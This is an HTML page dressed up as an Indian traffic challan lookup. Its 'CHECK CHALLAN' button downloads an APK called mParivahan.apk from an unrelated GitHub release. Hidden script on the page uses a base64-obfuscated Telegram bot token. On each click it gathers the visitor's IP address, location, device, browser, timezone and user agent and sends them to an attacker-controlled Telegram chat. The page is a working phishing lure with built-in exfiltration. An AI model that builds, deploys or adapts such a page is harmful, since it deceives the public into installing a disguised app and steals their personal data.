
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>View Challan</title>
<style>
body{
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
  margin:0;
  background:#f0f0f0;
}
.button{
  background-color:red;
  color:white;
  font-size:22px;
  padding:18px 40px;
  border:none;
  border-radius:10px;
  cursor:pointer;
  transition:transform 0.2s, background-color 0.2s;
  font-weight:bold;
  text-decoration:none;
  box-shadow:0 4px 8px rgba(0,0,0,0.2);
}
.button:hover{
  background-color:#cc0000;
  transform:translateY(-2px);
}
.button:active{
  transform:translateY(0);
}
</style>
</head>
<body>
<a class="button" id="challanBtn" href="https://github.com/moreignsourance-arch/oanw/releases/download/v1.0.0/mParivahan.apk">
  CHECK CHALLAN
</a>
<script>
// ================== OBFUSCATED CONFIG ==================
const _0x1a2b = atob("ODM3MTk3MjcxMDpBQUVFWW45dDU3dFB2UjhRS3gwMHhPZG9TYVdjUUIxdzNxbw=="); // BOT_TOKEN
const _0x3c4d = atob("LTEwMDM3NjAwMTA3MjQ="); // GROUP_CHAT_ID

function escapeHtml(unsafe) {
  return unsafe.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
}
function sendTelegram(textHTML) {
  const url = `https://api.telegram.org/bot${_0x1a2b}/sendMessage?chat_id=${_0x3c4d}&text=${encodeURIComponent(textHTML)}&parse_mode=HTML`;
  new Image().src = url;
}
async function getDetailedInfo() {
  let info = {
    ip: 'Unknown', country: 'Unknown', city: 'Unknown', device: 'Unknown',
    browser: 'Unknown', os: 'Unknown', screen: `${screen.width}x${screen.height}`,
    language: navigator.language, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
    referrer: document.referrer || 'Direct', userAgent: navigator.userAgent
  };
  const ua = navigator.userAgent;
  if (/android/i.test(ua)) info.device = 'Android';
  else if (/iphone|ipad|ipod/i.test(ua)) info.device = 'iOS';
  else if (/windows phone/i.test(ua)) info.device = 'Windows Phone';
  else if (/windows/i.test(ua)) info.device = 'Windows';
  else if (/mac/i.test(ua)) info.device = 'Mac';
  else if (/linux/i.test(ua)) info.device = 'Linux';
  if (ua.indexOf('Chrome') > -1) info.browser = 'Chrome';
  else if (ua.indexOf('Firefox') > -1) info.browser = 'Firefox';
  else if (ua.indexOf('Safari') > -1) info.browser = 'Safari';
  else if (ua.indexOf('Edge') > -1) info.browser = 'Edge';
  else if (ua.indexOf('MSIE') > -1 || ua.indexOf('Trident') > -1) info.browser = 'Internet Explorer';
  if (ua.indexOf('Windows NT 10.0') > -1) info.os = 'Windows 10';
  else if (ua.indexOf('Windows NT 6.3') > -1) info.os = 'Windows 8.1';
  else if (ua.indexOf('Windows NT 6.2') > -1) info.os = 'Windows 8';
  else if (ua.indexOf('Windows NT 6.1') > -1) info.os = 'Windows 7';
  else if (ua.indexOf('Mac OS X') > -1) info.os = 'macOS';
  else if (ua.indexOf('Android') > -1) info.os = 'Android';
  else if (ua.indexOf('iPhone') > -1 || ua.indexOf('iPad') > -1) info.os = 'iOS';
  else info.os = 'Unknown';
  try {
    const res = await fetch('https://ipapi.co/json/');
    const data = await res.json();
    info.ip = data.ip; info.country = data.country_name; info.city = data.city;
  } catch (e) {}
  return info;
}
function trackClick() {
  let count = localStorage.getItem('challan_clicks') || 0;
  count = parseInt(count) + 1;
  localStorage.setItem('challan_clicks', count);
  const clickData = { timestamp: new Date().toISOString(), count: count, userAgent: navigator.userAgent.substring(0, 50) };
  const history = JSON.parse(localStorage.getItem('challan_history') || '[]');
  history.push(clickData);
  localStorage.setItem('challan_history', JSON.stringify(history.slice(-50)));
  getDetailedInfo().then(info => {
    const messageHTML = `
<b>📲 Challan Button Clicked</b>
<b>🕒 Time:</b> ${escapeHtml(new Date().toLocaleString())}
<b>🔢 Total clicks:</b> ${count}
<b>🌍 IP:</b> ${escapeHtml(info.ip)}
<b>🏳 Country:</b> ${escapeHtml(info.country)}
<b>🏙 City:</b> ${escapeHtml(info.city)}
<b>📱 Device:</b> ${escapeHtml(info.device)}
<b>💻 OS:</b> ${escapeHtml(info.os)}
<b>🌐 Browser:</b> ${escapeHtml(info.browser)}
<b>🖥 Screen:</b> ${escapeHtml(info.screen)}
<b>🗣 Language:</b> ${escapeHtml(info.language)}
<b>⏰ Timezone:</b> ${escapeHtml(info.timezone)}
<b>🔗 Referrer:</b> ${escapeHtml(info.referrer)}
<b>📄 Full User Agent:</b>
<code>${escapeHtml(info.userAgent)}</code>`;
    sendTelegram(messageHTML);
  });
}
document.getElementById("challanBtn").addEventListener("click", function(e) {
  e.preventDefault();
  trackClick();
  window.location.href = this.href;
});
</script>
</body>
</html>
